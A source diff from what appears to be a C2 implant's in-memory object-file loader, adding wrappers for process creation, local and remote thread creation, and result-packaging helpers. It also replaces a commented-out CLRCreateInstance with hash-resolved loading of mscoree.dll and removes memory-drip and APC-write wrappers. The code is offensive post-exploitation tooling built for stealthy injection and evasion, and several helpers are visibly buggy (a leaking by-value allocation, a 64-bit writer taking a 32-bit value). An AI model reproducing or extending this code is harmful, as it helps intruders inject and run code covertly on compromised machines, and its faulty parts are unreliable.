@@ -348,6 +348,115 @@ auto DECLFN Coff::WriteProcessMemory(
     return Self->Mm->Write( BaseAddress, (BYTE*)Buffer, Size, Written, hProcess );
 }
 
+auto DECLFN Coff::CreateProcessW(
+    _In_  WCHAR*                Application,
+    _In_  WCHAR*                Command,
+    _In_  ULONG                 Flags,
+    _In_  LPSECURITY_ATTRIBUTES PsAttributes,
+    _In_  LPSECURITY_ATTRIBUTES ThreadAttributes,
+    _In_  BOOL                  Inherit,
+    _In_  PVOID                 Env,
+    _In_  WCHAR*                CurrentDir,
+    _In_  STARTUPINFOW*         StartupInfo,
+    _Out_ PROCESS_INFORMATION* PsInfo
+) -> BOOL {
+    G_KHARON
+
+    return Self->Ps->Create( Application, Command, Flags, PsAttributes, ThreadAttributes, Inherit, Env, CurrentDir, StartupInfo, PsInfo );
+}
+
+auto DECLFN Coff::CreateThread(
+    LPSECURITY_ATTRIBUTES  Attributes,
+    SIZE_T                 StackSize,
+    LPTHREAD_START_ROUTINE Start,
+    PVOID                  Parameter,
+    ULONG                  Flags
+) -> HANDLE {
+    G_KHARON
+    
+    return Self->Td->Create( NtCurrentProcess(), Start, Parameter, StackSize, Flags, nullptr, Attributes);
+}
+
+auto DECLFN Coff::PkgCreate(
+    _In_  ULONG     CommandId,
+    _In_  CHAR*     UUID,
+    _Out_ PACKAGE*  Package
+) -> VOID {
+    G_KHARON
+
+    Package = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );
+
+    Package->Buffer = PTR( hAlloc( sizeof( BYTE ) ) );
+    Package->Length = 0;
+}; 
+
+auto DECLFN Coff::PkgDestroy(
+    _In_ PACKAGE* Package
+) -> VOID {
+    G_KHARON
+
+    return Self->Pkg->Destroy( Package );
+}
+
+auto DECLFN Coff::PkgInt8(
+    _In_ PACKAGE* Package,
+    _In_ BYTE     Data
+) -> VOID {
+    G_KHARON
+
+    return Self->Pkg->Byte( Package, Data );
+};
+
+auto DECLFN Coff::PkgInt16(
+    _In_ PACKAGE* Package,
+    _In_ INT16    Data
+) -> VOID {
+    G_KHARON
+
+    return Self->Pkg->Int16( Package, Data );
+};
+
+auto DECLFN Coff::PkgInt32(
+    PACKAGE* Package,
+    INT32    Data
+) -> VOID {
+    G_KHARON
+
+    return Self->Pkg->Int32( Package, Data );
+}
+
+auto DECLFN Coff::PkgInt64(
+    PACKAGE* Package,
+    INT32    Data
+) -> VOID {
+    G_KHARON
+
+    return Self->Pkg->Int64( Package, Data );
+}
+
+auto DECLFN Coff::PkgBytes(
+    PACKAGE* Package,
+    PBYTE    Buffer,
+    ULONG    Length
+) -> VOID {
+    G_KHARON
+
+    return Self->Pkg->Bytes( Package, Buffer, Length );
+}
+
+auto DECLFN Coff::CreateRemoteThread(
+    HANDLE Handle, LPSECURITY_ATTRIBUTES Attributes, 
+    SIZE_T                 StackSize, 
+    LPTHREAD_START_ROUTINE Start, 
+    LPVOID                 Parameter, 
+    DWORD                  Flags, 
+    LPDWORD                ThreadId
+) -> HANDLE {
+    G_KHARON
+
+    return Self->Td->Create( Handle, Start, Parameter, StackSize, Flags, ThreadId, Attributes );
+}
+
 auto DECLFN Coff::ReadProcessMemory(
     HANDLE hProcess, 
     PVOID  BaseAddress, 
@@ -431,71 +540,25 @@ auto DECLFN Coff::LoadLibraryW(
     return (HMODULE)Self->Lib->Load( LibA );
 }
 
-auto DECLFN Coff::DriAlloc(
-    SIZE_T Size, 
-    ULONG  Protect, 
-    HANDLE Handle
-) -> PVOID {
-    G_KHARON
-
-    return Self->Mm->DripAlloc( Size, Protect, Handle );
-}
-
-auto DECLFN Coff::WriteApc(
-    HANDLE Handle, 
-    PVOID  Base, 
-    BYTE*  Buffer, 
-    ULONG  Size
-) -> BOOL {
-    G_KHARON
-
-    return Self->Mm->WriteAPC( Handle, Base, Buffer, Size );
-}
-
 auto DECLFN Coff::CLRCreateInstance(
     REFCLSID clsid, REFIID riid, LPVOID* ppInterface
 ) -> HRESULT {
-    // G_KHARON
+    G_KHARON
 
-    // if (!ppInterface) {
-    //     return E_POINTER;
-    // }
+    UPTR Mscoree = 0;
+    HRESULT (*CLRCreateInstance)(CLSID, REFIID, PVOID*);
 
-    // if ( Self->Config.Syscall ) {
-    //     struct GUID_PACK {
-    //         UPTR part1;
-    //         UPTR part2;
-    //     };
-        
-    //     GUID_PACK clsid_pack = {
-    //         *reinterpret_cast<const UPTR*>(&clsid.Data1),
-    //         *reinterpret_cast<const UPTR*>(&clsid.Data2)
-    //     };
-        
-    //     GUID_PACK riid_pack = {
-    //         *reinterpret_cast<const UPTR*>(&riid.Data1),
-    //         *reinterpret_cast<const UPTR*>(&riid.Data2)
-    //     };
+    if ( ! ( Mscoree = LdrLoad::Module( Hsh::Str<char>("mscoree.dll") ) ) ) {
+        Mscoree = Self->Lib->Load( "mscoree.dll" );
+    }
 
-    //     return static_cast<HRESULT>(Self->Spf->Call(
-    //         reinterpret_cast<UPTR>(Self->Mscoree.CLRCreateInstance),
-    //         clsid_pack.part1,
-    //         clsid_pack.part2,
-    //         reinterpret_cast<UPTR>(&clsid.Data3),
-    //         reinterpret_cast<UPTR>(clsid.Data4),
-    //         riid_pack.part1,
-    //         riid_pack.part2,
-    //         reinterpret_cast<UPTR>(&riid.Data3),
-    //         reinterpret_cast<UPTR>(riid.Data4),
-    //         reinterpret_cast<UPTR>(ppInterface)
-    //     ));
-    // } else {
-    //     return Self->Mscoree.CLRCreateInstance(
-    //         clsid,
-    //         riid,
-    //         ppInterface
-    //     );
-    // }
+    CLRCreateInstance = (decltype(CLRCreateInstance))LdrLoad::_Api( Mscoree, Hsh::Str<char>( "CLRCreateInstance" ) );
+
+    return CLRCreateInstance(
+        clsid,
+        riid,
+        ppInterface
+    );
 }
 
 auto DECLFN Coff::SetThreadContext(
